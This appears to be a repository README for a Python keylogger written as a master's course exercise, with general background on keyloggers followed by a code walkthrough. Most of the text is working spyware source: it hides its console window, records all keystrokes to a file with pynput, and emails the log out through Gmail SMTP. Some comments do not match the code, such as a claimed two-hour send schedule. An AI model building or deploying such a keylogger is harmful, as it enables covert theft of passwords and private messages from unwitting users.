# Keylogger

## Description:
A simple keylogger that I had to create during my Master Degree studies.  
You will have a copy of the code in the repository, even if there the description of the different parts is in Spanish (:pray:sorry:pray:).  
Please note that I created this code for educational purposes only.

## What is a KEYLOGGER?

A keylogger is a type of software or hardware device designed to record and monitor all keystrokes made on a computer or other input devices like a keyboard. It essentially captures and logs the data entered by a user, including passwords, sensitive information, messages, and other textual inputs.

## How it works?

Keyloggers can operate at different levels in a computing system:  

1) Software Keyloggers: These are installed on a computer as a hidden application or malicious code and run in the background. They intercept keyboard inputs before they are processed by other applications and log them to a file or send the data to a remote server. If programmed to do so, they can spread to other devices the computer comes in contact with.
2) Hardware Keyloggers: These are physical devices inserted between the computer keyboard and the computer's USB or PS/2 port. They capture keystrokes directly from the keyboard and store them internally or transmit them wirelessly to a receiver.

## Why is it important?

While keyloggers can have legitimate applications, they can also be misused for malicious purposes:  

1) Privacy Concerns: Unauthorized use of keyloggers can violate a person's privacy by capturing sensitive information, such as login credentials and personal messages, without their knowledge or consent.
2) Identity Theft and Fraud: Keyloggers are sometimes used by cybercriminals to steal personal information, including credit card numbers and banking credentials, leading to identity theft and financial fraud.
3) Malware Distribution: Keyloggers can be embedded in malicious software, such as trojans and viruses, which are distributed through phishing emails or compromised websites.
4) Spyware and Espionage: In cases of espionage or corporate espionage, keyloggers can be used to gather sensitive information from targeted individuals or organizations.

Here some examples for legitimate scenarios:  
  
1) Monitoring Employee Activities: In some workplaces, keyloggers may be used by employers to monitor employee activities to ensure compliance with company policies and detect any unauthorized actions.  
2) Parental Control: Some parents use keyloggers to monitor their children's online activities and protect them from potential online threats.
3) Forensic Investigations: In digital forensics, keyloggers can be used as tools to investigate cybercrimes and collect evidence.

## What does my script do?

The code sets up the necesary configurations for the Keylogger. It defines the log file name (<b>'pulsation_info'</b>), setting up the path where the keylog file will be stored (file_path) and configuring the program to run in the background by hiding the console window.  
The code includes a function (<b>'send_email'</b>) that sends an email with the keylog file as an attachment. The email credentials (email address and password) are provided, and the send_email function is invoked immediately to send the email.  
The keylogger functions are defined to capture key presses (<b>on_press</b>) and write the captured keys to the log file (<b>write_file</b>). The keylogger will capture all pressed keys until the escape key is pressed, at which point it will stop running.

## Script explanation

First let's import the needed libraries:  

```
# Libraries
# These will be installed using the option that includes PYCHARM under Settings > Interpreters
# I was not able to install these libraries on MacOS using PIP, so I chose to use PARALLELS with Windows 10 and deliver the PEC from there

# Libraries / modules to be used: pywin32, pynput, inputimeout, scipy(wavfile), cryptography,
# requests(to get PC information), pillow(for screenshots)

# To be able to manage the automatic line break after 5 minutes without typing
from inputimeout import inputimeout, TimeoutOccurred

# To manage keylogger in the background
import win32console
import win32gui

# In order to send mail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# For the input of the keys
from pynput.keyboard import Key, Listener

# Modules necessary to manage TIME
import time
import os
import schedule
import datetime as dt
```
Now let's jumpt to the code part.  

Define variables
```
## Keylogger code

# Variables log file
pulsation_info = "pulsaciones_grabadas.txt"

# Variables for SEND EMAIL
email_address = "PUT YOUR EMAIL IN HERE ... @gmail.com"
password = "PUT YOUR PSSWD IN HERE"
to_address = "PUT AN EMAIL IN HERE ... @gmail.com"

# Variable for time management
tiempo_extra = 5
```

Let's set the path of the of the generated <b>'.txt'</b> file.  

```
# Path where the TXT file of our keylogger will be generated
file_path = "C:\\USE A PATH YOU LIKE"
# Allows you to add an extension to the file
extend = "\\"
```

To make the program run in background.  

```
# Run program in the background
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
```

Function to send email.  

```
# Send the email that adds the TXT file as an attachment to export the pressed keys
def send_email(filename, attachment, to_address):
    mens = MIMEMultipart()
    mens['From'] = email_address
    mens['To'] = to_address
    mens['Subject'] = "Keylogger file"
    body = "Cuerpo_del_correo"
    mens.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')  # reads the binary
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    # Adds the header 
    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    mens.attach(p)
    # Variable to use SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    txt = mens.as_string()
    s.sendmail(email_address, to_address, txt)
    s.quit()
```

Part of code that adds the <b>'.txt'</b> file as an attachment and send it out every 2 hours.  

```
# Instance that attaches the generated txt as an attachment and sends it every 2 hours
send_email(pulsation_info, file_path + extend + pulsation_info, to_address)

# Variables TIME
currentTime = time.time()
stoppingTime = time.time() + tiempo_extra

count = 0
keys = []
```

Key press capture funtion.  

```
# Function ON_PRESS which will capture the keys that are pressed
def on_press(key):
    global keys, count, currentTime

    print(key)
    keys.append(key)
    count += 1

    # To add more lines to TXT file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# Function that records the keystrokes in "pulsaciones_grabadas.txt" file
def write_file(keys):
    with open(file_path + extend + pulsation_info, "a") as f:
        for key in keys:
            conv = str(key).replace("'", "")  # to better read the keys pressed in the TXT file
            # each time the SPACE key is pressed it will generate a space between each word and add it to the TXT file
            if conv.find("space") > 0:
                f.write(' ')
                f.close()
            # each time the ENTER key is pressed it will generate a line break and add it to the TXT file
            elif conv.find("enter") > 1:
                f.write('\n')
                f.close()
            elif conv.find("Key") == -1:
                f.write(conv)
                f.close()
```  

To facilitate the exit of the keylogger.

```
# Exit of the keylogger
def on_release(key):
    if key == Key.esc:
        return False
```

Block listener.

```
# Listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## What's next?

The idea is to improve this script or rewrite form zero once I improved my coding skills :nerd_face:
